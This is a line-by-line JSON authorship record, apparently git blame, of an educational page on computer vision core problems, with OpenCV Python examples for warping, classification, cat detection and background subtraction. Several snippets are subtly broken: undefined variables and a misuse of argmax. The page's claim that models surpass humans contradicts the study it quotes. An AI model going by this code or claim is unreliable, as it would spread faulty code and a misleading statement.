      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "For a typical computer vision system, the tasks it aims to perform may include, but are not limited to, the following:\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "- Geometric Image Transformation"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "- Image Filtering"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "- Image Classification"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "- Structural Analysis and Shape Descripting"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "- Feature Detection"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "- Object Detection"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "- Object Localization"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "- Object Tracking"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Core Problems in Computer Vision"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "Most problems requiring computer vision can be boiled down to one or a combination of the following core problems: image transformation, classification, localization, detection, and tracking.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "This section introduces some of those core problems, and cites working examples for demonstration purposes. The examples use Open Source Computer Vision library (OpenCV) - containing implemented algorithm packages and utility functions for building computer vision applications. It is freely distributed and licensed for both academic and commercial use. The code examples cited in this section are written in Python, but OpenCV has API supports for C++ and Java as well."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "### Image Transformations"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "In many applications, image transformation is often the first step that standardizes the input and allows the application to subsequently perform more complex analysis."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "![CamScanner](image-transformation.png \"CamScanner Image Warpping\")"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "*[Affine Transformation](https://www.camscanner.com/)*"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "The most common transformations are scaling - resizing of image, translation - shifting of selected zones in image, rotation of image for an angle, and affine transformation - a combination of scaling, rotating, and translation, that reserves parallel lines in the original image.\u003csup\u003e[[7]](#footnote7)\u003c/sup\u003e"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "**Example:** Perspective Warping using OpenCV"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "*This example is extracted from \"Building a Pokedex in Python: OpenCV and Perspective Warping\" tutorial originally published on PyImageSearch on May 5, 2014. Refer to original tutorial [here](https://www.pyimagesearch.com/2014/05/05/building-pokedex-python-opencv-perspective-warping-step-5-6/). All pictures and code snippets in this example belong to its original author, Adrian Rosebrock.*"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "![Warp Transformation](image-transformation-example-1.jpg \"Perspective Warpping\")"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose we have the picture of the Gameboy on the left, and we want to crop out just the game screen like the right side of the picture above. Notice that on the left the screen is slightly skewed, and we want to project it upright."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "First of all, we need to have the coordinates of the 4 corners of the screen. This can be entered by hand, as OpenCV has helper functions for capturing mouse input; for example, user can use the mouse to click on the 4 corners of the game screen one by one and the application captures the coordinates of the clicked points. See more [here](https://docs.opencv.org/3.3.0/db/d5b/tutorial_py_mouse_handling.html). Then, we map the skewed image to a another rectangle frame pixel by pixel."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "# We use numpy - a library for scientific computing with Python."
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "# OpenCV is referred to as \u0027cv2\u0027."
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "# Declare a rectangle with the 4 corners - top-left, top-right,"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "# bottom-right, bottom-left, to represent the portion of the"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "# screen in the original image."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "(tl, tr, br, bl) \u003d rect"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "# Arbitrarily choose dimensions for the output image."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "width \u003d 100"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "height \u003d 100"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "# Construct an array to store the desired coordinates of the 4"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "# corners of the screen after being transformed."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "dst \u003d numpy.array(["
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "\t[0, 0],"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "\t[width - 1, 0],"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "\t[width - 1, height - 1],"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "\t[0, height - 1]], dtype \u003d \"float32\")"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "# Calculate the perspective transform matrix and warp the"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "# portion of the original image to grab the up-right screen."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "M \u003d cv2.getPerspectiveTransform(rect, dst)"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "warp \u003d cv2.warpPerspective(orig, M, (width, height))"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "# \u0027orig\u0027 here refers to the original image."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "# \u0027warp\u0027 now stores the screen projected straight and up-right"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "# as seen in the picture above."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "### Image Classification"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "Image classification refers to the task of identifying the object present in an image. Typically, a predetermined set of possible objects is given and the classification of the image is the object that is most likely to exist in it.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "![Classification](image-classification-1.png \"Cat Classified\")"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "*[source](https://cs231n.github.io/classification/)*"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "Image classification is often paired with object localization, which is the task of finding where in the image the object is. Many more complex problems in computer vision, such as object detection and segmentation, can be reduced to image classification and localization.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "![Classification](image-classification-2.png \"Cat Localized\")"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "*[Fei-Fei Li, Andrej Karpathy \u0026 Justin Johnson (2016) cs231n, Lecture 8 - Slide 8, Spatial Localization and Detection (01/02/2016)](https://cs231n.github.io/classification/)*"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "At the moment, there already exist classification/localization models that surpass trained humans. For example, in the 2014 ImageNet Large Scale Visual Recognition Challenge (ILSVRC),"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Our results indicate that a trained human annotator is capable of outperforming the best model (GoogLeNet) with approximately 1.7% chance (p \u003d 0.022).\u003csup\u003e[[8]](#footnote8)\u003c/sup\u003e"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "**Example:** Classifying images using deep learning and OpenCV"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "*This example is extracted from \"Deep Learning with OpenCV\" tutorial originally published on PyImageSearch on August 21, 2017. Refer to original tutorial [here](https://www.pyimagesearch.com/2017/08/21/deep-learning-with-opencv/). All pictures and code snippets in this example belong to its original author, Adrian Rosebrock.*"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "In this example, we use OpenCV and a pre-trained image classification model called the GoogLeNet.\u003csup\u003e[[15]](#footnote15)\u003c/sup\u003e The goal of this example is to use the model to classify the object present in a given image. First, we load the image in question and the model, then we feed the image to the model and take the most confident prediction."
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "# Load the class labels from disk. Class labels is the actual"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "# name of a class of objects written in English, e.g. dogs,"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "# cats, helicopters. After taking the output from the model,"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "# we match that output with a label."
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "rows \u003d open(\u0027./labels.txt\u0027).read().strip().split(\"\\n\")"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "# Load the model files from disk."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "net \u003d cv2.dnn.readNetFromCaffe(\u0027./googlenet.prototxt\u0027, \u0027./googlenet.caffemodel\u0027)"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "# Load the image and resize it to 224x224 to fit into the model."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "image \u003d cv2.imread(\u0027./image.jpg\u0027)"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "blob \u003d cv2.dnn.blobFromImage(image, 1, (224, 224))"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "# Feed the image to the model."
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "net.setInput(blob)"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "preds \u003d net.forward()"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "# \u0027preds\u0027 now stores the classes and their respective confident"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "# levels. We use numpy to grab the class with highest"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "# probability and store the index of that class in \u0027idx\u0027."
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "idx \u003d numpy.argmax(preds[0])[::-1]"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "# We get the name, or label, of the class, along with the"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "# probability, and put them on the image."
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "text \u003d \"Label: {}, {:.2f}%\".format(classes[idx], preds[0][idx] * 100)"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "cv2.putText(image, text, (5, 25),  cv2.FONT_HERSHEY_SIMPLEX,"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "\t\t\t0.7, (0, 0, 255), 2)"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "Some results:"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "![Beagle classified](image-classification-example-1.jpg \"Beagle Classification\")"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "![Traffic light classified](image-classification-example-2.jpg \"Traffic Light Classification\")"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "### Object Detection"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "Object detection, as the name suggests, detects objects within an image. It combines image classification and localization in a sense that it gives the classification and bounding box (localization) of object in an image, but it does this to all instance of every known type of objects found in the image, instead of assuming only one type is present.\u003csup\u003e[[9]](#footnote9)\u003c/sup\u003e"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "![Detection](object-detection.png \"Object detected\")"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "*[source](https://github.com/tensorflow/models/tree/master/research/object_detection)*"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "Obviously, object detection requires tremendous computing power compared to classification/localization; a naïve approach is to repeatedly classify and localize for every pixel in the image. In recent years, breakthroughs have been made towards a quicker and more efficient detecting algorithms, such as sharing computation on a whole image as can be seen in YOLO, SSD, and R-FCN. Notably, in 2016, the YOLO system named \u0027YOLO9000\u0027 was able to achieve real-time detection on motion pictures, and even able to detect object categories that it had never been trained for.\u003csup\u003e[[9]](#footnote9)\u003c/sup\u003e"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "**Example:** Cat detection with OpenCV"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "*This example is extracted from \"Detecting cats in images with OpenCV\" tutorial originally published on PyImageSearch on August 21, 2017. Refer to original tutorial [here](https://www.pyimagesearch.com/2016/06/20/detecting-cats-in-images-with-opencv/). All pictures and code snippets in this example belong to its original author, Adrian Rosebrock.*"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "In this example, we apply object detection to find cats lurking in a given image using a Haar feature-based cascade classifier for face of cats. Haar cascade is a fast, efficient, and somewhat restricting, object detection method proposed by *Paul Viola and Michael Jones*.\u003csup\u003e[[16]](#footnote16)\u003c/sup\u003e The classifier used below is pre-trained and shared by OpenCV; there are other classifiers for detecting various objects stored in [OpenCV repository](https://github.com/Itseez/opencv/tree/master/data/haarcascades). In this example, for simplicity, we limit to detecting only 1 class of object, cats. In practice, one can combine many classifiers to detect multiple classes."
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "Since Haar cascade method relies on geometrical features of pixels, we convert the image to grayscale before processing it since color information is not relevant."
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "# Load the input image and convert it to grayscale."
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "image \u003d cv2.imread(\u0027./image.jpg\u0027)"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "gray_image \u003d cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "# Load from disk the Haar cascade detector for cat faces, then"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "# detect cats in the input image."
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "detector \u003d cv2.CascadeClassifier(\u0027./haarcascade_frontalcatface.xml\u0027)"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "rects \u003d detector.detectMultiScale(gray, scaleFactor\u003d1.3,"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "\tminNeighbors\u003d10, minSize\u003d(75, 75))"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "# \u0027rects\u0027 now contains all the rectangles that each corresponds"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "# to a cat\u0027s face detected in the image."
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "# For each rectangle in \u0027rects\u0027, we draw it into the original"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "# image and label the cat\u0027s number."
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "for (i, (x, y, w, h)) in enumerate(rects):"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "\tcv2.rectangle(image, (x, y), (x + w, y + h), (0, 0, 255), 2)"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "\tcv2.putText(image, \"Cat #{}\".format(i + 1), (x, y - 10),"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "\t\tcv2.FONT_HERSHEY_SIMPLEX, 0.55, (0, 0, 255), 2)"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "Some results:"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "![Cat detected](object-detection-example-1.jpg \"Cat Detection\")"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "![Cats detected](object-detection-example-2.jpg \"Cat Detection\")"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "### Object Tracking"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "Object tracking is the process of following and establishing the movement of a specific object of interest in a sequential set of images - typically a video clip or a real-time camera feed.\u003csup\u003e[[10]](#footnote10)\u003c/sup\u003e It is crucial for autonomous driving systems such as self-driving cars or unmanned aerial vehicles (UAVs)."
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "![Tracking movement of cars with OpenCV](object-tracking.png \"Object tracked\")"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "*[Tracking movement of cars with OpenCV](https://docs.opencv.org/3.3.1/)*"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "Object tracking algorithms can be divided into 2 categories: those applied to still backgrounds, and those to moving image frames such as those from a car camera.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e Algorithms in the former category typically compare subsequent images, extract the difference and deduce the movements, if any. Notable in this category are Optical Flow and the Waterfall algorithms.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e Moving image sources on the other hand require the tracking system to learn the relationships between each object\u0027s motion and the surroundings.\u003csup\u003e[[4]](#footnote4)\u003c/sup\u003e In any case, all tracking systems require an initial detection of the object to track.\u003csup\u003e[[6]](#footnote6)\u003c/sup\u003e"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "**Example:** Background subtraction for tracking with OpenCV"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": "*This example is extracted from \"Background Subtraction"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "\" tutorial originally published on OpenCV\u0027s website. Refer to original tutorial [here](https://docs.opencv.org/3.3.0/db/d5c/tutorial_py_bg_subtraction.html). All pictures and code snippets in this example belong to OpenCV organization.*"
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "In this example, different background subtraction methods are applied on a video track, differentiating the moving pedestrians from still background. The methods are 2 Gaussian mixture-based background/foreground segmentation algorithms developed by *P. KadewTraKuPong and R. Bowden*\u003csup\u003e[[17]](#footnote17)\u003c/sup\u003e and *Z.Zivkovic*\u003csup\u003e[[18]](#footnote18)\u003c/sup\u003e\u003csup\u003e[[19]](#footnote19)\u003c/sup\u003e, and a per-pixel Bayesian segmentation algorithm by *Andrew B. Godbehere, Akihiro Matsukawa, and Ken Goldberg*\u003csup\u003e[[20]](#footnote20)\u003c/sup\u003e."
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "The process is simple, the video is captured frame by frame and for each image frame, a subtraction mask is applied."
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "cap \u003d cv2.VideoCapture(\u0027./test.avi\u0027)"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "# We use the algorithm by P. KadewTraKuPong and R. Bowden."
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "fgbg \u003d cv2.createBackgroundSubtractorMOG()"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "# Use the below instead for Z.Zivkovic\u0027s algorithm."
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "# fgbg \u003d cv2.createBackgroundSubtractorMOG2()"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "# Use the below instead for the algorithm by Godbehere et al."
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": "# fgbg \u003d cv2.createBackgroundSubtractorGMG()"
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": "while(1):"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": "    ret, frame \u003d cap.read()"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": "    if ret:"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": "      fgmask \u003d fgbg.apply(frame)"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": "      cv2.imshow(\u0027frame\u0027,fgmask)"
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": "      k \u003d cv2.waitKey(30) \u0026 0xff"
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": "      if k \u003d\u003d 27:"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": "          break"
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": "    else:"
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "      break"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "Some results:"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": "Original frame:"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": "![Background not subtracted](object-tracking-example-1.jpg \"Original Frame\")"
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
